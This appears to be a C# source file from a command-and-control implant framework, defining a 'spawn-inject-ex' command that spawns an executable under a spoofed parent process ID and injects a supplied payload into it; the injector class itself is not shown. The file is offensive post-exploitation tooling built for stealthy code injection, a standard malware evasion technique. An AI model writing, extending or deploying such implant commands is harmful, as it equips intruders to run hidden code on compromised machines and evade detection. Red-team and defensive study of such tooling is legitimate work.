using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Agent.Models;
using Agent.Internal;

namespace Agent.Commands
{
    public class SpawnInjectEx : AgentCommand
    {
        public override string Name => "spawn-inject-ex";

        public override string Execute(AgentTask task)
        {
            if (task.Args is null || task.Args.Length == 0)
                return "Error Provide Args <ppid> <fullPathToExe>";
            
            if (!int.TryParse(task.Args[0], out var ppid))
                return "Error Provide Args <ppid> <fullPathToExe>";
            var exe = task.Args[1];
            var injector = new SpawnInjectorPPID();
            var success = injector.Inject(task.FileBytes, ppid, exeToRun: exe);
            if (success) return "Spawned New Process And Injected!";
            return "Failed to inject spawned process";
        }
    }
}
